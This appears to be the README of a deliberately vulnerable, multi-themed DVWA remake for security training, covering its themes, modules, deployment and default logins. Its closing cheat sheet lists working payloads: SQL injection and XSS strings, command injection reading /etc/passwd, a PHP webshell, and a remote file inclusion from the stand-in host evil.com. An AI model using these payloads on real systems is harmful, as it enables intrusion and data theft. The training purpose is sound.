# TicketDisaster / Stadia / Flux / Rusty Bucket

**Vulnerable Web Application** — a modern, multi-themed reimagining of [DVWA](https://github.com/digininja/DVWA) for security training.

> "Same vulnerabilities, different disguise — because hackers don't discriminate."

---

## What Is This?

A deliberately vulnerable web application designed for security professionals, students, and developers to practice common web attacks in a safe, legal environment. Choose from **4 fun themes** — each re-skins the entire application while keeping all 8 vulnerability modules fully functional.

---

## Themes

| Theme | Name | Accent | Description |
|-------|------|--------|-------------|
| **Music** | TicketDisaster | Purple | Concert ticket shop — Red Rocks, Mission Ballroom, and Colorado venues. Scraped from real venue listings. |
| **Sports** | Stadia | Orange | Denver-area sports tickets — Nuggets, Avalanche, Rockies, Broncos, CU Buffs, and more. |
| **Games** | Flux | Green | Steam-like video game store — real titles, real prices, scraped from gaming sources. |
| **Cars** | Rusty Bucket | Red | Hilariously sketchy used car lot selling $1,000-or-less "death traps" to high school students. School appropriate. |

On first visit you'll be prompted to pick a theme. You can switch anytime via the sidebar.

---

## Vulnerability Modules

Each module has **4 difficulty levels**: Low, Medium, High, and Impossible.

| Module | Attack Type | Description |
|--------|-------------|-------------|
| Search | **SQL Injection** | User input concatenated directly into SQL queries |
| Search (Reflected) | **XSS (Reflected)** | User input reflected back without encoding |
| Reviews | **XSS (Stored)** | Malicious scripts stored in the database and served to all users |
| Coupon/Code Redeemer | **Command Injection** | User input passed to `shell_exec()` via `grep` |
| Avatar/Photo Upload | **File Upload** | Unrestricted file uploads allowing PHP webshell execution |
| Change Password | **CSRF** | Password change via GET request with no/weak CSRF protection |
| Policies/Help Pages | **File Inclusion** | User-controlled `include()` enabling LFI and RFI |
| VIP/Admin Login | **Brute Force** | Login form with no/weak rate limiting or lockout |

### Security Levels

- **Low** — No security at all. Learn how the vulnerability works.
- **Medium** — Common but flawed defenses. Learn to bypass weak protections.
- **High** — Stronger defenses, still exploitable. Requires creative thinking.
- **Impossible** — Properly secured code. The reference implementation for how to do it right.

---

## Deployment

### Requirements

- **Fedora 42+** or **Ubuntu 24.04+** (bare metal, VM, or container — no Docker required)
- Root/sudo access

### Quick Start

```bash
git clone <this-repo> ticket-disaster
cd ticket-disaster
sudo bash deploy.sh
```

The deploy script will automatically:

1. Detect your OS (Fedora or Ubuntu)
2. Install Apache, PHP (with mysqli, gd, curl), and MariaDB
3. Configure PHP with intentionally insecure settings (`allow_url_include = On`, etc.)
4. Configure Apache with a virtual host
5. Set up the MariaDB database
6. Deploy the application to `/var/www/html/ticketdisaster`
7. Configure logging to `/var/log/ticketdisaster/`
8. Set up a daily cron job for the data scraper
9. Open firewall ports

### After Deployment

1. Visit `http://<your-ip>/` in a browser
2. Choose a theme (Music, Sports, Games, or Cars)
3. Click **Create / Reset Database** on the setup page
4. Login with: `admin` / `password`

### Docker (Legacy)

The original Docker setup still works if preferred:

```bash
# Two-container (app + MySQL)
docker-compose up -d

# Single container (standalone)
docker build -t ticket-disaster -f Dockerfile.standalone .
docker run -d -p 8080:80 ticket-disaster
```

---

## Logging

All logs are stored in `/var/log/ticketdisaster/`:

| Log File | Contents |
|----------|----------|
| `error.log` | Apache error log |
| `access.log` | Apache access log |
| `scraper.log` | Data scraper output (cron) |

---

## Default Credentials

| Username | Password |
|----------|----------|
| `admin` | `password` |
| `gordonb` | `abc123` |
| `1337` | `charley` |
| `pablo` | `letmein` |
| `smithy` | `password` |

---

## Data Scraping

Each theme has a built-in scraper that pulls real data from online sources:

- **Music** — Bandsintown, Songkick, venue websites (Red Rocks, Mission Ballroom, etc.), Wikipedia for artist images
- **Sports** — ESPN API for Denver-area team schedules
- **Games** — Steam API for featured/top-selling games with real prices
- **Cars** — Uses curated seed data for maximum comedy

Access the scraper from the sidebar under **Settings > Scrape Data**, or set up the cron job for daily auto-updates.

---

## Project Structure

```
.
├── deploy.sh                    # Auto-deploy script (Fedora/Ubuntu)
├── config/
│   ├── config.inc.php           # Database configuration
│   └── themes.php               # Theme definitions (4 themes)
├── dvwa/includes/
│   ├── dvwaPage.inc.php         # Core functions (auth, DB, sessions)
│   ├── header.php               # Theme-aware header/sidebar
│   ├── footer.php               # Theme-aware footer
│   └── Scraper.php              # Multi-source data scraper
├── theme_chooser.php            # First-visit theme selection
├── index.php                    # Dashboard (theme-aware)
├── login.php                    # Login page (theme-aware)
├── setup.php                    # DB setup with theme-specific seed data
├── scraper.php                  # Scraper UI
├── security.php                 # Security level selector
├── about.php                    # About page
├── assets/
│   ├── css/style.css            # Main stylesheet
│   └── images/bands/            # Scraped images
├── hackable/uploads/            # File upload target (intentionally writable)
└── vulnerabilities/
    ├── sqli/                    # SQL Injection
    ├── xss_r/                   # XSS (Reflected)
    ├── xss_s/                   # XSS (Stored)
    ├── exec/                    # Command Injection
    ├── upload/                  # File Upload
    ├── csrf/                    # Cross-Site Request Forgery
    ├── fi/                      # File Inclusion
    └── brute/                   # Brute Force
```

---

## Attack Cheat Sheet

### SQL Injection (Low)
```
' OR '1'='1
' UNION SELECT username, password FROM users-- -
```

### XSS Reflected (Low)
```
<script>alert('XSS')</script>
```

### XSS Stored (Low)
Post `<script>alert('XSS')</script>` in the review message field.

### Command Injection (Low)
```
ROCKS2026; whoami
ROCKS2026; cat /etc/passwd
```

### File Upload (Low)
Upload a PHP file: `<?php system($_GET['cmd']); ?>` then access `/hackable/uploads/yourfile.php?cmd=whoami`

### CSRF (Low)
Craft a link:
```
/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

### File Inclusion (Low)
```
?page=../../../etc/passwd
?page=http://evil.com/shell.txt   (if allow_url_include is On)
```

### Brute Force (Low)
Use Hydra or Burp Suite Intruder against the login form with a wordlist.

---

## Disclaimer

> **WARNING:** This application is **intentionally vulnerable**. Do **NOT** deploy it on a public-facing server or production environment. Use it **only** in controlled lab environments for educational purposes.

---

## Credits

- Based on [DVWA](https://github.com/digininja/DVWA) by Robin Wood ([digi.ninja](https://digi.ninja))
- Multi-theme system, deploy script, and modernized UI built with Claude Code
